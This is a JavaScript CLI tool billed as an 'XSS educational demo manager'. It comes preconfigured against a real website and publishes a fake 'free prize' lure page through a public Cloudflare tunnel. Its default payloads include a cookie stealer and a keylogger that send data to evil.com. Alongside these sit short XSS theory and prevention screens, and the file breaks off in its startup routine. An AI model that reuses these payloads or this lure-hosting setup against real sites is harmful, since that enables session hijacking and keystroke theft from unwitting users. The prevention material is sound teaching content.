/**
 * ============================================================================
 * XSS EDUCATIONAL DEMO - MANAGER CLI v1.0
 * ============================================================================
 * Cross-Site Scripting (XSS) demonstration tool for educational purposes.
 *
 * Types of XSS:
 * - Reflected XSS: Malicious script reflected off a web server
 * - Stored XSS: Malicious script stored on the server (e.g., in a comment)
 * - DOM-based XSS: Vulnerability in client-side code
 *
 * Usage: node xss-manager.js
 * ============================================================================
 */

const http = require('http');
const readline = require('readline');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

// ============================================
// ANSI COLOR CODES - Sci-Fi Terminal Theme
// ============================================
const C = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    dim: '\x1b[2m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    white: '\x1b[37m',
};

// ============================================
// CONFIGURATION
// ============================================
const CONFIG_FILE = path.join(__dirname, 'xss-config.json');
const DEFAULT_CONFIG = {
    targetUrl: 'https://www.skool.com',
    targetName: 'Skool',
    maliciousPort: 3002,
    customDomain: '',
    tunnel: 'cloudflared',
    xssPayloads: [
        {
            id: 'xss-alert',
            name: 'Basic Alert',
            type: 'reflected',
            payload: '<script>alert("XSS")</script>',
            enabled: true,
        },
        {
            id: 'xss-cookie',
            name: 'Cookie Stealer',
            type: 'stored',
            payload: '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
            enabled: true,
        },
        {
            id: 'xss-keylogger',
            name: 'Keylogger',
            type: 'stored',
            payload: '<script>document.onkeypress=function(e){fetch("https://evil.com/log?k="+e.key)}</script>',
            enabled: false,
        },
    ],
};

let config = loadConfig();
let tunnelProcess = null;
let maliciousServer = null;

// ============================================
// CONFIG MANAGEMENT
// ============================================
function loadConfig() {
    try {
        if (fs.existsSync(CONFIG_FILE)) {
            const saved = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
            return { ...DEFAULT_CONFIG, ...saved };
        }
    } catch (e) {
        log('warn', 'Could not load config, using defaults.');
    }
    return JSON.parse(JSON.stringify(DEFAULT_CONFIG));
}

function saveConfig() {
    fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
    log('ok', 'Config saved to ' + CONFIG_FILE);
}

// ============================================
// UI HELPERS
// ============================================
function clearScreen() {
    process.stdout.write('\x1Bc');
}

function log(type, msg) {
    const timestamp = new Date().toLocaleTimeString('en-US', { hour12: false });
    const prefix = {
        info:    `${C.cyan}[${timestamp}]${C.reset} ${C.blue}[INFO]${C.reset}`,
        ok:      `${C.cyan}[${timestamp}]${C.reset} ${C.green}[ OK ]${C.reset}`,
        warn:    `${C.cyan}[${timestamp}]${C.reset} ${C.yellow}[WARN]${C.reset}`,
        error:   `${C.cyan}[${timestamp}]${C.reset} ${C.red}[FAIL]${C.reset}`,
        attack:  `${C.cyan}[${timestamp}]${C.reset} ${C.magenta}[XSS!]${C.reset}`,
        system:  `${C.cyan}[${timestamp}]${C.reset} ${C.white}[SYS ]${C.reset}`,
    }[type] || `[${type}]`;
    console.log(`  ${prefix} ${msg}`);
}

function printBanner() {
    console.log('');
    console.log(`${C.red}${C.bright}
 ██╗  ██╗███████╗███████╗
 ╚██╗██╔╝██╔════╝██╔════╝
  ╚███╔╝ ███████╗███████╗
  ██╔██╗ ╚════██║╚════██║
 ██╔╝ ██╗███████║███████║
 ╚═╝  ╚═╝╚══════╝╚══════╝${C.reset}`);
    console.log(`${C.dim}  ════════════════════════════════════════════════════════════${C.reset}`);
    console.log(`${C.red}${C.bright}  XSS${C.reset}${C.dim} // Cross-Site Scripting Demo Manager v1.0${C.reset}`);
    console.log(`${C.dim}  ════════════════════════════════════════════════════════════${C.reset}`);
    console.log('');
}

function printConfig() {
    console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────────┐${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}TARGET CONFIG${C.reset}                                                ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Target URL:      ${C.bright}${config.targetUrl}${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Target Name:     ${C.bright}${config.targetName}${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Malicious Port:  ${C.bright}${config.maliciousPort}${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Custom Domain:   ${C.bright}${config.customDomain || '(none)'}${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Tunnel:          ${C.bright}${config.tunnel}${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}XSS PAYLOADS${C.reset}                                                ${C.cyan}│${C.reset}`);
    config.xssPayloads.forEach((payload, i) => {
        const status = payload.enabled ? `${C.green}● ACTIVE${C.reset}` : `${C.red}○ DISABLED${C.reset}`;
        console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}[${i + 1}]${C.reset} ${payload.name.padEnd(20)} ${status} ${C.dim}[${payload.type}]${C.reset}`);
    });
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}[${config.xssPayloads.length + 1}]${C.reset} ${C.bright}+ Add Custom Payload${C.reset}                                    ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────────┘${C.reset}`);
    console.log('');
}

function printMenu() {
    console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────┐${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}MAIN MENU${C.reset}                                                 ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}                                                         ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[1]${C.reset} 🚀 One-Click Deploy (Server + Tunnel)              ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[2]${C.reset} 🎯 Configure Target URL                            ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[3]${C.reset} ⚙️  Manage XSS Payloads                          ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[4]${C.reset} 🌐 Domain / Tunnel Setup                         ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[5]${C.reset} 📋 View Current Config                             ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[6]${C.reset} 💾 Save Config                                     ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[7]${C.reset} 📖 XSS Theory (Educational)                      ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[8]${C.reset} 🛡️  How to Prevent XSS                            ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.red}[9]${C.reset} ❌ Terminate Session                               ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}                                                         ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────┘${C.reset}`);
    console.log('');
}

// ============================================
// MALICIOUS SERVER
// ============================================
function generateMaliciousHTML() {
    const targetUrl = config.targetUrl.replace(/\/$/, '');
    const targetName = config.targetName;

    let payloadCards = '';
    config.xssPayloads.forEach((payload, i) => {
        if (!payload.enabled) return;
        payloadCards += `
                <div class="payload-card">
                    <h4>${payload.name} [${payload.type}]</h4>
                    <code>${payload.payload.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</code>
                    <button class="copy-btn" onclick="copyPayload('${i}')">Copy</button>
                </div>`;
    });

    return `
        <!DOCTYPE html>
        <html>
        <head>
            <title>🎉 ${targetName} - Special Offer!</title>
            <style>
                body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; background: #1a1a2e; color: #eee; }
                .prize { background: linear-gradient(135deg, #ff6b6b 0%, #ee5a5a 100%); color: white; padding: 30px; border-radius: 10px; text-align: center; margin: 20px 0; }
                .prize h2 { font-size: 2em; margin: 10px 0; }
                .payloads { margin: 20px 0; }
                .payload-card { background: #16213e; border: 1px solid #0f3460; border-radius: 8px; padding: 15px; margin: 10px 0; }
                .payload-card h4 { color: #e94560; margin: 0 0 10px 0; }
                .payload-card code { display: block; background: #0f3460; padding: 10px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 0.9em; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
                .copy-btn { background: #e94560; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; margin-top: 10px; }
                .copy-btn:hover { background: #c73e54; }
                .btn { background: #e94560; color: white; border: none; padding: 15px 30px; font-size: 1.2em; border-radius: 5px; cursor: pointer; margin: 10px; }
                .btn:hover { background: #c73e54; }
                .info-box { background: #16213e; border-left: 4px solid #e94560; padding: 15px; margin: 15px 0; border-radius: 0 5px 5px 0; }
                .warning { background: #fff3cd; border: 2px solid #ffc107; padding: 15px; border-radius: 5px; margin-top: 20px; color: #333; }
            </style>
        </head>
        <body>
            <h1>🎉 Congratulations!</h1>
            <div class="prize">
                <h2>🎁 YOU WON A FREE PRIZE! 🎁</h2>
                <p>Click below to claim your reward!</p>
                <button class="btn" onclick="claimPrize()">CLAIM PRIZE</button>
            </div>
            <div class="info-box">
                <strong>🔗 Target:</strong> ${targetName} (${targetUrl})<br>
                <strong>🎯 XSS Payloads:</strong> ${config.xssPayloads.filter(p => p.enabled).length}
            </div>
            <div class="payloads">
                <h3>📦 Available Payloads</h3>
                ${payloadCards}
            </div>
            <div class="warning">
                <h3>🎓 EDUCATIONAL DEMO</h3>
                <p>This page demonstrates XSS payloads for educational purposes. In a real attack, these payloads would be injected into vulnerable input fields.</p>
            </div>
            <script>
                const payloads = ${JSON.stringify(config.xssPayloads)};
                
                function copyPayload(index) {
                    const payload = payloads[index].payload;
                    navigator.clipboard.writeText(payload).then(() => {
                        alert('Payload copied to clipboard!');
                    });
                }
                
                function claimPrize() {
                    alert('XSS Demo: In a real attack, the payload would execute here.');
                    console.log('XSS Payloads:', payloads);
                }
            </script>
        </body>
        </html>
    `;
}

function startMaliciousServer() {
    const server = http.createServer((req, res) => {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(generateMaliciousHTML());
    });

    server.on('error', (err) => {
        if (err.code === 'EADDRINUSE') {
            log('error', `Port ${config.maliciousPort} is already in use!`);
            log('info', 'Kill the process using that port or change the port in Option 2.');
        } else {
            log('error', 'Server error: ' + err.message);
        }
        process.exit(1);
    });

    server.listen(config.maliciousPort, () => {
        log('attack', 'XSS Demo server deployed!');
        log('info', `Local:    http://localhost:${config.maliciousPort}`);
    });

    return server;
}

// ============================================
// TUNNEL MANAGEMENT
// ============================================
async function startTunnel() {
    const cloudflaredPath = path.join(__dirname, 'cloudflared.exe');

    if (config.tunnel === 'cloudflared') {
        if (!fs.existsSync(cloudflaredPath)) {
            log('error', 'cloudflared not found. Please run the CSRF manager first to download it.');
            return null;
        }
        log('system', 'Starting Cloudflare Tunnel...');
        tunnelProcess = spawn(cloudflaredPath, ['tunnel', '--url', 'http://localhost:' + config.maliciousPort], { stdio: 'pipe' });
    } else {
        log('info', 'No tunnel configured. Using localhost only.');
        return null;
    }

    return new Promise((resolve) => {
        let output = '';
        const timeout = setTimeout(() => {
            log('warn', 'Tunnel timeout - check if it started manually.');
            resolve(null);
        }, 30000);

        tunnelProcess.stdout.on('data', (data) => {
            output += data.toString();
            const urlMatch = output.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/i);
            if (urlMatch) {
                clearTimeout(timeout);
                log('ok', `Tunnel URL: ${urlMatch[0]}`);
                resolve(urlMatch[0]);
            }
        });

        tunnelProcess.stderr.on('data', (data) => {
            output += data.toString();
            const urlMatch = output.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/i);
            if (urlMatch) {
                clearTimeout(timeout);
                log('ok', `Tunnel URL: ${urlMatch[0]}`);
                resolve(urlMatch[0]);
            }
        });
    });
}

function stopTunnel() {
    if (tunnelProcess) {
        tunnelProcess.kill();
        tunnelProcess = null;
        log('system', 'Tunnel stopped.');
    }
}

// ============================================
// MENU SYSTEM
// ============================================
async function mainMenu() {
    while (true) {
        clearScreen();
        printBanner();
        printConfig();
        printMenu();

        const choice = await ask(`  ${C.green}┌─[${C.reset}${C.bright}XSS${C.reset}${C.green}]─[${C.reset}${C.bright}manager${C.reset}${C.green}]${C.reset}\n  ${C.green}└─▶${C.reset} `);

        switch (choice.trim()) {
            case '1':
                await oneClickDeploy();
                break;
            case '2':
                await configureTarget();
                break;
            case '3':
                await managePayloads();
                break;
            case '4':
                await configureTunnel();
                break;
            case '5':
                clearScreen();
                printBanner();
                printConfig();
                await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
                break;
            case '6':
                saveConfig();
                await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
                break;
            case '7':
                showXSSExplanation();
                await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
                break;
            case '8':
                showPreventionGuide();
                await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
                break;
            case '9':
                console.log(`\n  ${C.red}  ⚠️  Terminating session...${C.reset}`);
                stopTunnel();
                if (maliciousServer) maliciousServer.close();
                console.log(`  ${C.dim}  Stay ethical, stay legal.${C.reset}\n`);
                rl.close();
                process.exit(0);
            default:
                log('error', 'Invalid option selected.');
                await ask(`  ${C.dim}Press Enter to try again...${C.reset}`);
        }
    }
}

async function oneClickDeploy() {
    clearScreen();
    printBanner();
    log('system', 'Initiating one-click deployment...');
    console.log('');

    log('system', '[1/3] Starting XSS demo server...');
    maliciousServer = startMaliciousServer();
    await new Promise(r => setTimeout(r, 1000));

    log('system', '[2/3] Starting tunnel...');
    const tunnelUrl = await startTunnel();

    log('system', '[3/3] Deployment complete!');
    console.log('');

    console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────┐${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.green}${C.bright}✅ DEPLOYMENT COMPLETE${C.reset}                                   ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Local:    ${C.bright}http://localhost:${config.maliciousPort}${C.reset}                       ${C.cyan}│${C.reset}`);
    if (tunnelUrl) {
        console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Public:   ${C.bright}${tunnelUrl}${C.reset}                       ${C.cyan}│${C.reset}`);
    }
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.bright}XSS PAYLOADS:${C.reset}                                        ${C.cyan}│${C.reset}`);
    config.xssPayloads.forEach((p, i) => {
        if (!p.enabled) return;
        console.log(`  ${C.cyan}│${C.reset}  ${C.green}[${i + 1}]${C.reset} ${p.name.padEnd(20)} ${C.dim}[${p.type}]${C.reset}              ${C.cyan}│${C.reset}`);
    });
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}Press Enter to stop and return to menu${C.reset}                    ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────┘${C.reset}`);
    console.log('');

    await ask('');
    stopTunnel();
    if (maliciousServer) {
        maliciousServer.close();
        maliciousServer = null;
    }
    log('system', 'Server stopped.');
    console.log('');
}

async function configureTarget() {
    clearScreen();
    printBanner();
    log('system', 'Loading target configuration...');
    console.log('');

    const newTarget = await ask(`  ${C.yellow}▸${C.reset} Target URL [${C.bright}${config.targetUrl}${C.reset}]: `);
    if (newTarget.trim()) {
        config.targetUrl = newTarget.trim().replace(/\/$/, '');
    }

    const newName = await ask(`  ${C.yellow}▸${C.reset} Target Name [${C.bright}${config.targetName}${C.reset}]: `);
    if (newName.trim()) {
        config.targetName = newName.trim();
    }

    const newPort = await ask(`  ${C.yellow}▸${C.reset} Malicious Port [${C.bright}${config.maliciousPort}${C.reset}]: `);
    if (newPort.trim() && !isNaN(parseInt(newPort))) {
        config.maliciousPort = parseInt(newPort.trim());
    }

    log('ok', 'Target configuration updated!');
    await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
}

async function managePayloads() {
    while (true) {
        clearScreen();
        printBanner();
        log('system', 'Loading XSS payloads...');
        console.log('');

        console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────┐${C.reset}`);
        console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}XSS PAYLOADS${C.reset}                                         ${C.cyan}│${C.reset}`);
        console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
        
        config.xssPayloads.forEach((payload, i) => {
            const status = payload.enabled ? `${C.green}● ACTIVE${C.reset}` : `${C.red}○ DISABLED${C.reset}`;
            console.log(`  ${C.cyan}│${C.reset}  ${C.green}[${i + 1}]${C.reset} ${payload.name.padEnd(20)} ${status} ${C.dim}[${payload.type}]${C.reset}  ${C.cyan}│${C.reset}`);
        });
        
        console.log(`  ${C.cyan}│${C.reset}  ${C.green}[${config.xssPayloads.length + 1}]${C.reset} ${C.bright}+ Add Custom Payload${C.reset}                                    ${C.cyan}│${C.reset}`);
        console.log(`  ${C.cyan}│${C.reset}  ${C.green}[${config.xssPayloads.length + 2}]${C.reset} ← Back to Main Menu                                 ${C.cyan}│${C.reset}`);
        console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────┘${C.reset}`);
        console.log('');

        const choice = await ask(`  ${C.green}┌─[${C.reset}${C.bright}XSS${C.reset}${C.green}]─[${C.reset}${C.bright}payloads${C.reset}${C.green}]${C.reset}\n  ${C.green}└─▶${C.reset} `);

        const num = parseInt(choice.trim());
        
        if (num >= 1 && num <= config.xssPayloads.length) {
            await editPayload(num - 1);
        } else if (num === config.xssPayloads.length + 1) {
            await addPayload();
        } else if (num === config.xssPayloads.length + 2) {
            return;
        } else {
            log('error', 'Invalid option.');
            await ask(`  ${C.dim}Press Enter to continue...${C.reset}`);
        }
    }
}

async function addPayload() {
    console.log('');
    log('system', 'Creating new XSS payload...');
    console.log('');

    const name = await ask(`  ${C.yellow}▸${C.reset} Payload Name: `);
    
    console.log('');
    console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────┐${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}PAYLOAD TYPE${C.reset}                                           ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[1]${C.reset} Reflected XSS                                      ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[2]${C.reset} Stored XSS                                         ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[3]${C.reset} DOM-based XSS                                       ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────┘${C.reset}`);
    console.log('');

    const typeChoice = await ask(`  ${C.yellow}▸${C.reset} Select type: `);
    const typeMap = { '1': 'reflected', '2': 'stored', '3': 'dom' };
    const type = typeMap[typeChoice.trim()] || 'reflected';

    const payload = await ask(`  ${C.yellow}▸${C.reset} Payload code: `);

    config.xssPayloads.push({
        id: 'xss-' + Date.now(),
        name: name.trim() || 'Custom Payload',
        type: type,
        payload: payload.trim(),
        enabled: true,
    });

    log('ok', 'Payload added!');
    await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
}

async function editPayload(index) {
    const payload = config.xssPayloads[index];
    
    console.log('');
    log('system', 'Editing: ' + payload.name);
    console.log('');

    const name = await ask(`  ${C.yellow}▸${C.reset} Name [${payload.name}]: `);
    if (name.trim()) payload.name = name.trim();

    const enabled = await ask(`  ${C.yellow}▸${C.reset} Enabled? (y/n) [${payload.enabled ? 'y' : 'n'}]: `);
    if (enabled.trim().toLowerCase() === 'y') payload.enabled = true;
    if (enabled.trim().toLowerCase() === 'n') payload.enabled = false;

    const newPayload = await ask(`  ${C.yellow}▸${C.reset} Payload [${payload.payload.substring(0, 30)}...]: `);
    if (newPayload.trim()) payload.payload = newPayload.trim();

    log('ok', 'Payload updated!');
    await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
}

async function configureTunnel() {
    clearScreen();
    printBanner();
    log('system', 'Loading tunnel configuration...');
    console.log('');

    console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────┐${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}TUNNEL CONFIGURATION${C.reset}                                   ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[1]${C.reset} Cloudflare Tunnel (No account needed)              ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[2]${C.reset} Custom Domain (Your own domain)                    ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[3]${C.reset} No Tunnel (Localhost only)                        ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[4]${C.reset} ← Back to Main Menu                             ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────┘${C.reset}`);
    console.log('');

    const choice = await ask(`  ${C.green}┌─[${C.reset}${C.bright}XSS${C.reset}${C.green}]─[${C.reset}${C.bright}tunnel${C.reset}${C.green}]${C.reset}\n  ${C.green}└─▶${C.reset} `);

    switch (choice.trim()) {
        case '1':
            config.tunnel = 'cloudflared';
            log('ok', 'Cloudflare Tunnel selected.');
            break;
        case '2':
            config.tunnel = 'custom';
            const domain = await ask(`  ${C.yellow}▸${C.reset} Enter your domain: `);
            if (domain.trim()) {
                config.customDomain = domain.trim().replace(/^https?:\/\//, '').replace(/\/$/, '');
                log('ok', 'Custom domain set: ' + config.customDomain);
            }
            break;
        case '3':
            config.tunnel = 'none';
            log('ok', 'Tunnel disabled. Localhost only.');
            break;
        case '4':
            return;
    }

    await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
}

function showXSSExplanation() {
    clearScreen();
    printBanner();
    console.log(`
  ${C.cyan}┌─────────────────────────────────────────────────────────────┐${C.reset}
  ${C.cyan}│${C.reset} ${C.bright}${C.white}📖 XSS THEORY${C.reset}                                            ${C.cyan}│${C.reset}
  ${C.cyan}├─────────────────────────────────────────────────────────────┤${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.yellow}XSS${C.reset} (Cross-Site Scripting) allows attackers to       ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  inject malicious scripts into web pages viewed by others. ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.bright}TYPES OF XSS:${C.reset}                                        ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[1]${C.reset} ${C.bright}Reflected XSS${C.reset}                                  ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Malicious script reflected off a web server           ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Example: Search field that echoes input               ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - URL: https://site.com/search?q=<script>alert(1)</script>${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[2]${C.reset} ${C.bright}Stored XSS${C.reset}                                     ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Malicious script stored on the server                 ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Example: Comment field that saves input               ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Affects all users who view the page                  ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[3]${C.reset} ${C.bright}DOM-based XSS${C.reset}                                   ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Vulnerability in client-side JavaScript              ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Example: document.write(location.hash)                ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - No server interaction required                        ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.red}IMPACT:${C.reset}                                                  ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  - Session hijacking (stealing cookies)                     ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  - Keylogging                                              ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  - Phishing (fake login forms)                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  - Defacement                                              ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}└─────────────────────────────────────────────────────────────┘${C.reset}
`);
}

function showPreventionGuide() {
    clearScreen();
    printBanner();
    console.log(`
  ${C.cyan}┌─────────────────────────────────────────────────────────────┐${C.reset}
  ${C.cyan}│${C.reset} ${C.bright}${C.white}🛡️  HOW TO PREVENT XSS${C.reset}                                  ${C.cyan}│${C.reset}
  ${C.cyan}├─────────────────────────────────────────────────────────────┤${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[1]${C.reset} INPUT VALIDATION ⭐ (Best Defense)                    ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Validate all user input on server side              ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Whitelist allowed characters                        ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Reject or sanitize suspicious input                  ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[2]${C.reset} OUTPUT ENCODING                                     ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - HTML encode all output                              ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Use context-aware encoding (HTML, JS, URL, CSS)      ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Libraries: DOMPurify, OWASP Java Encoder            ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[3]${C.reset} CONTENT SECURITY POLICY (CSP)                        ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Restrict sources for scripts, styles, etc.           ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Example: default-src 'self'; script-src 'self'     ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Blocks inline scripts and eval()                     ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[4]${C.reset} HTTP-ONLY COOKIES                                   ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Set HttpOnly flag on session cookies                 ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Prevents JavaScript from reading cookies              ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[5]${C.reset} MODERN FRAMEWORKS                                    ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - React, Vue, Angular auto-escape by default           ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Avoid dangerouslySetInnerHTML, v-html, innerHTML    ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.yellow}DEFENSE IN DEPTH: Use multiple layers!${C.reset}                    ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}└─────────────────────────────────────────────────────────────┘${C.reset}
`);
}

// ============================================
// CLI HELPERS
// ============================================
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});

function ask(question) {
    return new Promise(resolve => rl.question(question, resolve));
}

// ============================================
// STARTUP SEQUENCE
// ============================================
async function startupSequence() {
    clearScreen();
    console.log('');
    console.log(`${C.red}${C.bright}
 ██╗  ██╗███████╗███████╗
 ╚██╗██╔╝██╔════╝██╔════╝
  ╚███╔╝ ███████╗███████╗
  ██╔██╗ ╚════██║╚════██║
 ██╔╝ ██╗███████║███████║
 ╚═╝  ╚═╝╚══════╝╚══════╝${C.reset}`);
    console.log(`${C.dim}  ════════════════════════════════════════════════════════════${C.reset}`);
    console.log(`${C.red}${C.bright}  XSS${C.reset}${C.dim} // Cross-Site Scripting Demo Manager v1.0${C.reset}`);
    console.log(`${C.dim}  ════════════════════════════════════════════════════════════${C.reset}`);
    console.log('');

    await typewriterEffect(`  ${C.cyan}[SYS]${C.reset} Initializing XSS Demo Manager...`, 20);
